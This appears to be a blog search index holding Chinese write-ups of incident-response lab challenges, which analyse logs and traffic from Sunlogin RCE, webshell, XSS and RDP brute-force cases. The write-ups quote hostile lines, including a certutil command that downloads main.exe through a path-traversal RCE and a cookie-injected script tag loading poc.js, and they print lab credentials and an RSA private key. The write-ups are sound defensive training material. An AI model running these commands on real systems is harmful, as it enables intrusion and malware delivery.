// 输出: 2 1 } 闭包\n闭包可以理解成定义在⼀个函数内部的函数，在本质上，闭包是将函数和函数外部连接在⼀起的，或者说是函数和其引⽤环境的组合体。\n闭包指的是⼀个函数和与其相关的引⽤环境组合⽽成的实体，简单来说就是\n闭包=函数+引⽤环境\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package main import \u0026#34;fmt\u0026#34; func adder() func(int) int { sum := 0 return func(x int) int { sum += x return sum } } func main() { pos, neg := adder(), adder() for i := 0; i \u0026lt; 10; i++ { fmt.Println(pos(i), neg(-2*i)) }} 输出： 0 0 1 -2 3 -6 6 -12 10 -20 15 -30 21 -42 28 -56 36 -72 45 -90 ","date":"2025-09-06T00:00:00Z","image":"http://localhost:1313/images/50.webp","permalink":"http://localhost:1313/p/go%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","title":"【GO】基础语法"},{"content":"简介 靶机来源 @vulntarget\n靶机可以采集本地搭建或者是云端调度\n搭建链接 https://github.com/crow821/vulntarget\nssh root@ip 密码xjnacos 启动 /var/local/下的 autorun.sh即可正常启动\n问题 1 nacos 用户密码的密文值作为 flag 提交 flag{密文}\n问题 2 shiro 的key为多少 shiro 的 key 请记录下来 （备注请记录下，可能有用）\n问题 3 靶机内核版本为 flag{}\n问题 4 尝试应急分析，运行 get_flag 然后尝试 check_flag 通过后提交 flag\n问题 5 尝试修复 nacos 并且自行用 poc 测试是否成功\nflag1 nacos 用户密码的密文值作为 flag 提交 flag{密文}\n根据题目描述，连接ssh后需在/var/local下运行autorun.sh以启动nacos服务。\n在/var/local目录下存在nacos目录，在nacos/conf/目录下发现nacos-mysql.sql,从中发 现了加密的nacos密码\n使用命令：\n1 2 3 cd nacos/conf //目录下 查看数据库中的pass关键字： cat nacos-mysql.sql | grep pass 1 flag{$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu} flag2 shiro 的key为多少 shiro 的 key 请记录下来 （请记录下来，会有用d）\n在nacos目录下存在一个nacos_config_xxx的zip文件，下载到本地后解压后DEFAULT_GROUP文件下存在三个文件 ADMIN_API、ADMIN_CONFIG、GATEWAY。在ADMIN_CONFIG中发现shiro配置\n1 其中key为 KduO0i+zUIMcNNJnsZwU9Q== 找到这个文件夹下的这个文件：\n1 nacos-server-2.0.1\\nacos\\nacos_config_export_20231206050259\\DEFAULT_GROUP 打开找到权限认证的key值：\n1 KduO0i+zUIMcNNJnsZwU9Q== 1 flag{KduO0i+zUIMcNNJnsZwU9Q==} flag3 靶机内核版本为 flag{}\n1 2 root@vulntarget:/var/local/nacos# uname -a Linux vulntarget 5.4.0-164-generic #181-Ubuntu SMP Fri Sep 1 13:41:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 1 flag{5.4.0-164-generic} flag4 尝试修复 nacos 并且自行用 poc 测试是否成功 此题无flag\n尝试应急分析，运行get_flag然后尝试check_flag通过后提交flag\n找一下get-flag和check_flag\n1 2 3 4 5 6 7 root@vulntarget:/var/local# find / -name get_flag /home/vulntarget/get_flag root@vulntarget:/var/local# root@vulntarget:/var/local# find / -name check_flag /home/vulntarget/check_flag root@vulntarget:/var/local# 然后运行一下看一下，这里的flag需要应急响应成功后刷新的flag才是正确的\n1 cat /etc/passwd 由于存在后门用户，这里我们需要删除这个用户即可：\n使用命令；\n1 userdel -f bt 删除bt用户，这里使用的是强制删除\n删除用户后\n要删除bt用户之后再去执行文件\n这里的文件删除rm -rf 这一行\n保存文件后，去执行之前的文件\n尝试修复nacos并且自行用poc测试是否成功\n这里找不到网站，网上看了大牛的wp，使用扫描器扫出来了\n1、弱口令 2、未授权 3、SQL注入 4、认证绕过\n1 2 pyc反编译 https://www.lddgo.net/string/pyc-compile-decompile ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/47.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java01-nacos/","title":"【玄机靶场】第八章 内存马分析-java01-nacos"},{"content":"简介 账号密码\n1 2 root apacherizhi ssh root@IP 1、提交当天访问次数最多的IP，即黑客IP：\n2、黑客使用的浏览器指纹是什么，提交指纹的md5：\n3、查看包含index.php页面被访问的次数，提交次数：\n4、查看黑客IP访问了多少次，提交次数：\n5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:\n常见日志文件位置\nApache日志\n1 2 3 4 5 6 访问日志：默认位置通常是 /var/log/apache2/access.log.1（Debian/Ubuntu） /var/log/httpd/access_log.1（CentOS/RHEL）。 错误日志：默认位置通常是 /var/log/apache2/error.log.1（Debian/Ubuntu） /var/log/httpd/error_log.1（CentOS/RHEL）。 SSH日志\n1 2 3 身份验证日志：通常位于 /var/log/auth.log（Debian/Ubuntu） /var/log/secure（CentOS/RHEL）。 系统日志\n1 2 3 系统日志：通常位于 /var/log/syslog（Debian/Ubuntu） /var/log/messages（CentOS/RHEL）。 flag1 1、提交当天访问次数最多的IP，即黑客IP：\n使用命令：\n1 cut -d- -f 1 access.log.1|uniq -c | sort -rn | head -20 1 flag{192.168.200.2} flag2 2、黑客使用的浏览器指纹是什么，提交指纹的md5：\n思路是什么，现在我们知道黑客的ip了啊，日志位置我们也知道了啊，直接筛选一波黑客ip不就行了；\n命令：\n1 cat access.log.1 |grep 192.168.200.2 |more 得到浏览器指纹\n1 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 加密如下：\n1 flag{2D6330F380F44AC20F3A02EED0958F66} flag3 3、查看包含index.php页面被访问的次数，提交次数：\n1 2 3 cat access.log.1 | grep \u0026#34;/index.php\u0026#34; | wc -l `wc -l` 命令用于统计行数，即访问次数。 1 flag{27} 发现不对，然后看一下日志：\n1 cat access.log.1 | grep \u0026#34;/index.php\u0026#34; 最后发现了有两个返回200其他都是404，尝试了flag{2}也不对，在改为25的时候对了。\n1 flag{25} flag4 4、查看黑客IP访问了多少次，提交次数：\n这里给出三个命令，都是可以查到的：\n1 2 3 4 5 cat access.log.1 | grep \u0026#34;192.168.200.2 - -\u0026#34; | wc -l cat access.log.1 | grep \u0026#34;192.168.200.2\u0026#34; | cut -d\u0026#39; \u0026#39; -f1 | sort | uniq -c grep \u0026#34;192.168.200.2\u0026#34; access.log.1 | cut -d\u0026#39; \u0026#39; -f1 | sort | uniq -c 1 flag{6555} flag5 5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:\n三条命令如下：\n1 2 3 4 5 cat access.log.1 | grep \u0026#34;03/Aug/2023:08:\u0026#34; | awk \u0026#39;{print $1}\u0026#39; | sort -nr| uniq -c |wc -l grep \u0026#34;03/Aug/2023:08:\u0026#34; access.log.1 | awk \u0026#39;{print $1}\u0026#39; | sort -nr | uniq -c | wc -l cat access.log.1 | grep \u0026#34;03/Aug/2023:08:\u0026#34; | awk \u0026#39;{print $1}\u0026#39; | sort -nr| uniq -c 1 flag{5} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/44.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","title":"【玄机靶场】第二章 日志分析- apache日志分析"},{"content":"flag1 下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag{xxxx.co.xxxx/w0ks//?YO=xxxxxxx}） (无需 http、https)；\n搜索一下http协议，并且返回200的流量包，发现只有两个，然后打开第一个发现一个完整的url\n1 http contains \u0026#34;200\u0026#34; 1 flag{tsdandassociates.co.sz/w0ks//?YO=1702920835} flag2 下载数据包文件 hacker1.pacapng，分析获取到的 zip 压缩包的 MD5 是什么 作为 FLAG 提交 FLAG（形式：flag{md5}）；\n打开第二个流量包：\n导出zip格式文件\n放HashClac里进行分析\n得出MD5值\n1 f17dc5b1c30c512137e62993d1df9b2f 1 flag{f17dc5b1c30c512137e62993d1df9b2f} flag3 下载数据包文件 hacker1.pacapng，分析 zip 压缩包通过加载其中的 javascript 文件到另一个域名下载后续恶意程序， 该域名是什么?提交答案:flag{域名}(无需 http、https)\n这个需要对js文件解码\n1 flag{shakyastatuestrade.com} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/48.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/","title":"【玄机靶场】第六章 流量特征分析-小王公司收到的钓鱼邮件"},{"content":"题目思路 题目没有给出提示，但根据标题命名得知分析的是蚁剑流量包，所以我们可以直接查看http数据包进行分析。通过对统计数据的分析，我们可以得到http数据大致的访问信息，再通过查询语句过滤流量包得到成功访问的流量包\n下载数据包 flag1 木马的连接密码是多少\n1、左键点击“统计”-\u0026gt;“HTTP”-\u0026gt;“分组计数器”查看分析HTTP流量数据\n2、http contains \u0026ldquo;200\u0026rdquo; 查看http协议中包含200（成功登录返回值）的流量包\n1 http contains \u0026#34;200\u0026#34; 3、右键其中一个请求包，点击“追踪流”-\u0026gt;“HTTP流”，进行查看分析，得到木马的连接密码是 \u0026ldquo;1\u0026rdquo;\nflag\n1 flag{1} flag2 黑客执行的第一个命令是什么\n题目思路：通过分析刚才语句过滤后的流量包，我们发现这些就是蚁剑连接执行命令的流量包，可以直接根据流量包顺序进行分析查看分析，解码后（根据编码特征发现是Base64编码）得到第一个命令执行语句\n1、查看第1个流量包中执行的命令信息\n2、右键编码“Value”位置，点击“分组字节流”，开始位置调整为“2”，解码为调整为“Base64”，查看流量包执行的命令内容，得到第一个执行的命令 \u0026ldquo;id\u0026rdquo;（查看当前用户uid）\n1 蚁剑会在编码前加两位随机生成的字符，所以需要调整开始位置 flag\n1 flag{id} flag3 黑客读取了哪个文件的内容，提交文件绝对路径?\n题目思路：根据之前的题目，我们已经找到了蚁剑连接的流量，以及执行的命令。继续对流量进行分析，查看流量包内容，得到读取的文件绝对路径\n1、依次查看请求流量包以及以及返回流量包，第三个返回包中回显了大量信息，猜测查看了文件内容（其实根据经验可以直接看出查看的是/etc/passwd文件）\n根据数据包来看，很明显是读取了passwd文件返回的内容。\n2、点击第3个请求包，右键编码“Value”位置，位置，点击“分组字节流”，开始位置调整为“2”，解码为调整为“Base64”，查看流量包执行的命令内容，得到黑客查看文件命令 \u0026ldquo;cat /etc/passwd\u0026rdquo;\nflag\n1 flag{/etc/passwd} flag4 黑客上传了什么文件到服务器，提交文件名?\n题目思路：根据之前做的分析，继续查看后面的流量包。通过分析回显流量包，发现第5个返回包与第2个返回包相比多了一个文件，由此可以得到文件名，当然我们也可以直接分析解码得到上传文件名\nflag\n1 flag{flag.txt} flag5 黑客上传的文件内容是什么?\n题目思路：我们在得到黑客上传的文件名后，通过查看返回包我们可以发现上传文件与执行系统命令的请求数据并不相同，只能查看请求数据包进行分析，通过对请求包数据的解码分析得到上传文件内容\n1、点击第4个请求包，右键“追踪流”-\u0026gt;“HTTP流”，将编码复制，进行解码\n2、首先进行URL解码（直接根据编码特征进行判断），查看后发现流量包后面有两段编码\n3、最后一段编码明显是Base64编码（解码后就是上传文件的绝对路径），猜测第二段编码为文件内容（蚁剑上传的文件会对内容进行16进制加密），进行解密得到文件内容 \u0026ldquo;flag{write_flag}\u0026rdquo;\n1 2 3 https://www.lddgo.net/string/hex 666C61677B77726974655F666C61677D0A flag\n1 flag{write_flag} flag6 黑客下载了哪个文件，提交文件绝对路径\n题目思路：这个与之前相同，直接查看流量包信息，解码后即可获得\n1、右键编码“Value”位置，位置，点击“分组字节流”，开始位置调整为“2”，解码为调整为“Base64”，查看流量包执行的命令内容，得到黑客下在的文件名 \u0026ldquo;config.php\u0026rdquo;\n1 flag{/var/www/html/config.php} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/49.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","title":"【玄机靶场】第六章 流量特征分析-蚁剑流量分析"},{"content":"简介 第四章 windows实战\nAdministrator xj@123456\nflag1 通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为多少,将黑客首次攻击成功的时间为作为 FLAG 提交(2028-03-26 08:11:25.123);\n1.获取向日葵日志文件：\n然后一个一个进行排查，发现sunlogin_service.20240321-191046文件内容比较多，拖出来进行分析：\n先排查一下日志文件中有多少IP地址,每个IP有多少条日志：\n1 grep -oE \u0026#39;\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\u0026#39; xrk.log | sort | uniq -c 1 2 3 4 5 6 7 8 9 10 2 0.0.0.0 2 1.1.1.1 4 127.0.0.1 2 127.1.1.1 594 192.168.31.114 1696 192.168.31.45 1 192.168.52.150 1651 47.111.107.239 1660 47.111.169.221 1 47.111.228.106 排除掉一些默认地址，然后一个IP一个IP进行查。\n发现192.168.31.45有很多恶意的访问路径。\n分析下来发现是尝试在利用CNVD-2022-10207：向日葵远程控制软件 RCE 漏洞。\nCNVD-2022-10207 漏洞是一种远程命令执行漏洞，存在于向日葵远程控制软件中。攻击者可以通过特制的 HTTP 请求利用此漏洞，执行任意命令或代码。\n1 grep \u0026#34;192.168.31.45\u0026#34; xrk.log 提取时间：\nflag\n1 flag{2024-03-26 10:16:25.585} flag2 通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;\n根据flag1,可以看出黑客IP为：192.168.31.45\nflag\n1 flag{192.168.31.45} flag3 通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;\n根据日志信息，可以看出：\n1 192.168.31.45:49329,/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe certutil -urlcache -split -f http://192.168.31.249/main.exe, plugin:check, session:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1 恶意活动指示： 路径遍历：/check?cmd=ping.... 是一种路径遍历尝试，试图访问系统中的powershell.exe。 命令执行：使用 certutil 工具下载文件 main.exe。 外部IP：下载源 http://192.168.31.249/main.exe 指向一个可能托管恶意程序的外部服务器。 恶意程序下载： 工具使用：certutil 是一个合法的Windows工具，但在这里被用于下载恶意文件，这是一个常见的攻击模式。 下载目标：目标文件 main.exe 可能是恶意程序。\nflag 1 flag{192.168.31.249} flag4 找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;\n从日志里找一下DEC，看有没有信息\n但并没有找到这个文件信息。但是我们看日志，发现一个qq.txt文件。\n1 2024-03-26 10:39:11.031 - Info - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49884, path: /check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe echo 647224830 \u0026gt; qq.txt, version: HTTP/1.1 搜索QQ群，发现了玄机的靶场群。\n找到文件：\n使用命令，对文件进行MD5加密\n1 md5sum DEC.pem flag\n1 flag{5ad8d202f80202f6d31e077fc9b0fc6b} flag5 通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;\n先使用RSA解到密钥：\nFlag4的DEC.pem文件就是rsa的私钥，不过格式需要稍加修改，将Private key改成大写即可\nPEM格式密钥：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 -----BEGIN RSA PRIVATE KEY----- MIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE J9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc HTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB AoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0 8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp 1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv MO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB gx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De HMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C mdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt trQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk zD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb xTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g -----END RSA PRIVATE KEY----- 要加密的内容\n1 N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w= 解密：\n1 NXVJSTQUAPGTXKSX 然后再AES解密：\n需要解密的内容：\n1 0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4= 密钥：\n1 NXVJSTQUAPGTXKSX iv偏移量是16个0\n获得答案：\n1 2 3 4 5 6 @suanve 时间是连续的，年份只是人类虚构出来用于统计的单位，2024年第一天和2023年最后一天， 不会有任何本质区别。你的花呗，你的客户,你的体检报告，窗外的寒风，都不会因为这是新的一年， 而停下对你的毒打。 GIVE YOU FLAG!!!!! flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1} flag\n1 flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/40.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-%E5%90%91%E6%97%A5%E8%91%B5/","title":"【玄机靶场】第四章 windows 实战-向日葵"},{"content":"简介 服务器场景操作系统 Windows7\n服务器账号密码：winlog/winlog123\n连接端口为：ip:3389\n按照题目提示可以根据系统功能分析，或桌面工具进行辅助分析\n注意：远控软件内IP为虚拟IP，如在进行进程中没有找到相关外连，应该是由于连接超时造成的断开了，重启环境服务器或软件即可继续对外发起请求，请见谅\n注意：题目中shell如需在本地分析，提前关闭杀毒软件，会被杀掉，非免杀\n注意：winlog用户在操作关于系统权限功能时，一定要使用管理员权限打开工具再去执行\n如：cmd直接打开则可能无法进行操作系统权限性操作，需右击cmd-使用管理员权限打开，才可以，其它工具也如此\n题目描述 某台Windows服务器遭到攻击者入侵，管理员查看发现存在大量rdp爆破的请求，攻击者使用了不同位置的IP(此处模拟)，进行爆破并成功，并成功进入了系统，进入系统后又做了其它危害性操作，请根据各题目完成填写\n题目来源公众号 州弟学安全\n1 文档：https://mp.weixin.qq.com/s/eJpsOeaEczcPE-uipP7vCQ 靶场开启 步骤 flag1 审计桌面的logs日志，定位所有扫描IP，并提交扫描次数\n直接把access.log文件拉出来，放kali中或者任意linux系统中查一下即可。 1 awk \u0026#39;{print $1}\u0026#39; access.log | sort | uniq -c | sort flag:\n1 flag{6385} flag2 审计相关日志，提交rdp被爆破失败次数\nWin+R打开，eventvwr.msc\n打开日志：\n然后根据要求进行筛选，事件ID为4625，可以看到登录失败次数为2594次\n登录失败日志ID为4625\n也可以使用工具进行查看\nflag 1 flag{2594} flag3 审计相关日志，提交成功登录rdp的远程IP地址，多个以\u0026amp;连接,以从小到大顺序排序提交\n事件ID筛选为4648，表示用使用凭据登录\n然后到处文件，放FullEventLogView软件中\n找到一个192.168.150.1\n第二个：192.168.150.128\n第三个：192.168.150.178\nflag: 1 flag{192.168.150.1\u0026amp;192.168.150.128\u0026amp;192.168.150.178} flag4 提交黑客创建的隐藏账号\n关于隐藏账号在用户组中可以查看到，快捷键WIN+R输入 \u0026lsquo;lusrmgr.msc\u0026rsquo;，看到用户中hacker$以及属性及所属的组\n1 flag{hacker$} flag5 提交黑客创建的影子账号\n影子账号真实环境中是无法在用户组/netuser/用户面板中看到，但是可以在注册表中看到并删除，快捷键WIN+R \u0026lsquo;regedit\u0026rsquo; 1 注册表地址：HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names 下图为hackers$对应的权限值/组信息/映射关系及用户相关目录，操作删除后将不存在此用户信息\n或者直接使用D盾即可\nflag\n1 flag{hackers$} flag6 提交远程shell程序的连接IP+端口，以IP:port方式提交\n在应急响应中应排查对外连接，这一步是必不可少的，使用netstat -nao查看到相应的端口状态，在后面看到可疑连接\n由内对外连接，可拿着这个IP去查询到地区为国外的IP，如果说你没看到这个对外连接，说明连接超时了，因为对方本身就没开放这个端口，可重启环境后再次查看到，本身就为了模拟哈\n玄机包括实战中可看到不少的对外连接，这时候怎么排查呢，以玄机为例\n可看到对外连接不少的互联网IP，排查思路如下 1 2 3 1. 根据外联IP地址进行排查，在情报平台进行查询 2. 根据端口进行排查，通常大端口或有特殊意义端口要确认 3. 依次根据PID进行排查，这个下面会讲到 flag:\n1 flag{185.117.118.21:4444} flag7 各位应该发现了，开机就外联了，这个时候我们应该联想到自启动，一般排查以下\n1 2 3 4 5 1. C:\\Users\\winlog\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 快捷命令：WIN+R shell:startup 将预自启动程序放入目录，会自启 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 注册表自启动：快捷键：WIN+R regedit 将绝对路径下程序进行字符串值保存会开机自启 搜索计划任务，进入任务计划程序，查看相关启动程序 当然了，在排查这些之前，我们需要知道在跑的程序是哪个，已知PID为3676(注意：此处如果突然没有外连，则是超时，需重启环境，这个没办法，不能做到真上线)\n1 tasklist | findstr \u0026#34;3676\u0026#34; 使用以上命令查看到启动的文件为xiaowei.exe，但是不知道绝对路径如何处置\n通过以上命令可获取PID的执行文件绝对路径，看到目录在\n1 wmic process get name,executablepath,processid | findstr 3676 这里不知道为什么恶意软件断了，PID也变了，打的时候换成自己查到的PID即可\n绝对路径为：\n1 C:\\Windows\\system64\\systemWo\\xiaowei.exe 当然了，我们也可以使用 netstat -naob查看进程的启动程序和端口，记得用管理员CMD才行。\n但是如需查看绝对路径的话还是按照上方方法，这里只是提供多一个方法排查参考\n此时，我们继续按照上面思路排查自启动问题，看到自启动方法为注册表开机自启\n将xiaowei.exe文件拖出来，拿到ida或者微步沙箱去看一下，明显的木马特征和Cobalt特征\n包括到最后面的网络行为特征也能看到外联IP地址、\nflag\n1 flag{xiaowei.exe} flag8 黑客使用了计划任务来定时执行某shell程序，提交此程序名字\n上面已经说了关于计划任务的一些排查思路，按照实战中，攻击队或黑客为了权限维持，不会只放一个远控工具，一般会埋雷进行启动计划任务，根据上方思路排查到，计划任务程序中存在的计划\n使用compmgmt.msc打开计算机管理\n然后查看任务计划程序\n可以看出触发时间\n点进去查看执行的程序，可看到执行绝对路径\n查看这个bat脚本，最后得到执行全过程，确认下载了xiaowei.exe文件到相关目录，最后每次开机自启xiaowei.exe文件上线\nflag: 1 flag{download.bat} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/39.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","title":"【玄机靶场】第四章-windows日志分析"},{"content":"简介 服务器场景操作系统 Linux\n服务器账号密码 root xjty110pora 端口 2222\n任务环境说明\n注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！\n应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查\nflag1 找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}\n1 /var/www/html 文件拉出来分析：\n1 flag{header.php} flag2 webshell的绝对路径 flag{xxxx/xxx/xxx/xxx/}\n直接使用D盾进行扫描即可！\n扫描出来一个一个分析一下。发现404.php为后门文件。\n1 flag{/var/www/html/usr/themes/default/404.php} flag3 黑客注入黑链文件的 md5 md5sum file flag{md5}\nD盾扫描出来的pool.js文件也很可疑\n确定poc1.js为黑链文件。\n1 PS D:\\html\u0026gt; certutil -hashfile .\\poc1.js MD5 1 flag{10c18029294fdec7b6ddab76d9367c14} flag4 攻击入口是哪里？url请求路径，最后面加/ flag{/xxxx.xxx/xxxx/x/}\n分析流量包\n在 Wireshark 的过滤器中输入 http 以过滤出所有 HTTP 请求和响应。这将使我们能够专注于与 Web 流量相关的数据包，当然这里也可以直接尝试定位文件“poc1.js”，因为题三我们已经找到了黑客注入的文件是“poc1.js”，所以我们可以尝试查找一下相关的数据包；\n1 http contains \u0026#34;poc1.js\u0026#34; 那我们右键追踪http进行分析；\n1 Cookie: 09f1f9758c26c309477b55f3a4bac8de__typecho_remember_url=http%3A%2F%2Fxxx.xxx.com%2F%22%3E%3C%2Fa%3E%3Cscript%2Fsrc%3Dhttp%3A%2F%2F192.168.20.130%2Fpoc.js%3E%3C%2Fscript%3E%3Ca%2Fhref%3D%22%23 这里的 Cookie 包含了一段注入的 JavaScript 代码，显然是黑链攻击的一部分。\nurl解码为：\n请求和响应中包含的信息表明http://192.168.20.130/index.php/archives/1/页面是黑链攻击的入口，通过Cookie注入的JavaScript代码引入了poc1.js文件，从而执行了恶意操作。这个URL是反弹的poc1.js的原因在于其作为恶意代码的载体和入口。\n1 flag{/index.php/archives/1/} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:1313/images/45.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/","title":"【玄机靶场】第五章 linux实战-黑链"},{"content":"简介 点击下载附件获取附件\n任务环境说明\n注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！\n应急响应工程师在收到设备告警后，在受到攻击的服务器保存了一份log 请你协助分析 LOG 文件提交对应的 FLAG。\n靶场 三个日志文件进行分析：\n过程 flag1 1.将黑客成功登录系统所使用的IP地址作为Flag值提交；\n查看登录成功事件(ID:4624)\n点击筛选事件ID 4624即可；\nflag:\n1 flag{192.168.36.133} flag2 2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；\n事件 ID: 4738\n直接事件查看器即可查看\n1 flag{Adnimistartro} flag3 3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；\n筛选 事件 ID 4663\nflag:\n1 flag{SCHEMA} flag4 4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；\n直接进应用程序.evtx文件里找就行\nflag\n1 flag{7036} flag5 5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。\n题目说黑客登录系统后修改了登录用户并且进行了多次重启，提交黑客修改用户重启的次数，这里我们需要在系统日志里面进行查看，查看事件ID 1074；\nflag:\n1 flag{3} 事件ID: 事件 ID 4624 - 成功的账户登录\n事件 ID 4625 - 登录失败\n事件 ID 4634 - 用户注销\n事件 ID 4647 - 用户主动注销\n事件 ID 4720 - 用户账户已创建\n事件 ID 4722 - 用户账户已启用\n事件 ID 4725 - 用户账户已禁用\n事件 ID 4726 - 用户账户已删除\n事件 ID 4670 - 权限服务状态变更\n事件 ID 4719 - 系统审计策略已更改\n事件 ID 6005 - 事件日志服务启动\n事件 ID 6006 - 事件日志服务停止\n事件 ID 4672 - 特权服务已分配\n事件 ID 4673 - 特权服务已请求\n事件 ID 7036 - 服务已更改状态\n事件 ID 1074 - 